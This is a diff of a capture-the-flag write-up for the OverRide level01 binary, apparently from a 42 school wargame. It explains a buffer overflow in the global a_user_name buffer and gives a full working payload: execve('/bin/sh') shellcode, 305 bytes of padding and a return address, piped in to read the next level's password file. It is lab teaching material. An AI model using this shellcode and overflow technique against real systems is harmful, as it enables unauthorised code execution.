@@ -31,46 +31,33 @@ verifying username....
 Enter Password: 
 admin
 nope, incorrect password...
-
 ```
 
 Even if we passed the check, the program immediately terminates so that wouldn't help us achieve privilege escalation anyway.
 
+The real vulnerability comes from the global variable `a_user_name`. Instead of being on the local stack of `main`, it is global (in the bss section). Moreover it is shorter that the number of bytes read with `fgets`: 100 bytes instead of 256. This means there is an opportunity for a buffer overflow.
 
-
-
-
+There is another mistake in the program which allows us to store a lot of data in the bss and on the stack. The username and password checks only verify the validity up to the length of the expected value (e.g. `memcmp(a_user_name, "dat_wil", 7)`), meaning that the username `dat_wil12345678` is considered valid.
 
 ```console
-$ objdump -R level01
-0804a008 R_386_JUMP_SLOT   puts@GLIBC_2.0
-$ objdump -t level01 | grep user
-[...]
-0804a040 g     O .bss   00000064              a_user_name
-```
-
-```
-(gdb) b main
-[...]
-(gdb) run
-[...]
-(gdb) info frame
-Stack level 0, frame at 0xffffc900:
- eip = 0x80484d5 in main; saved eip = 0xf7d90cb9
- Arglist at 0xffffc8f8, args: 
- Locals at 0xffffc8f8, Previous frame's sp is 0xffffc900
- Saved registers:
-  ebp at 0xffffc8f8, eip at 0xffffc8fc
-```
-
-```
-(gdb) r
-Starting program: /home/norxondor/42/override/level01/level01 
-[Thread debugging using libthread_db enabled]
-Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+level01@OverRide:~$ ./level01 
 ********* ADMIN LOGIN PROMPT *********
-Enter Username: dat_wil
+Enter Username: dat_wil12345678
 verifying username....
+
+Enter Password: 
+password
+nope, incorrect password...
+```
+
+The program segfaults at 0x55555555, which corresponds to UUUU, at offset 80 in the password buffer.
+
+```
+(gdb) run
+Starting program: /home/users/level01/level01 
+********* ADMIN LOGIN PROMPT *********
+dat_wil
+Enter Username: verifying username....
 
 Enter Password: 
 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
@@ -81,13 +68,29 @@ Program received signal SIGSEGV, Segmentation fault.
 0x55555555 in ?? ()
 ```
 
-Seems that the return address is overwritten after 80 characters.
-
-305 and not 306 (-1 because `fgets`)
-255 + 80 - 7 - 23
+The last thing we need is the address of `a_user_name`, where we will store our shellcode:
 
 ```console
-level01@OverRide:~$ (python -c 'print "dat_wil" + "\x31\xc0\x50\x04\x0b\x68//sh\x68/bin\x89\xe3\x31\xc9\x31\xd2\xcd\x80" + "A"*305 + "\x47\xa0\x04\x08"'; echo "cat /home/users/level02/.pass") | ./level01
+$ objdump -t level01 | grep user
+[...]
+0804a040 g     O .bss   00000064              a_user_name
+```
+
+It is found at 0x0804a040, so the address of the shellcode will be 0x0804a047, after the string `dat_wil`.
+
+We now have everything we need to construct an attack. The full payload consists of:
+- `dat_wil` to pass the username check
+- the shellcode (we'll reuse our 23-byte `execve("/bin/sh")` from rainfall)
+- 256 - 1 (`fgets` reads n-1 characters) - 7 - 23 + 80 = 305 dummy characters
+- the address of the shellcode in little endian
+
+```console
+level01@OverRide:~$ (
+python -c '
+print "dat_wil" + "\x31\xc0\x50\x04\x0b\x68//sh\x68/bin\x89\xe3\x31\xc9\x31\xd2\xcd\x80" + "A" * 305 + "\x47\xa0\x04\x08"
+';
+echo "cat /home/users/level02/.pass"
+) | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
 
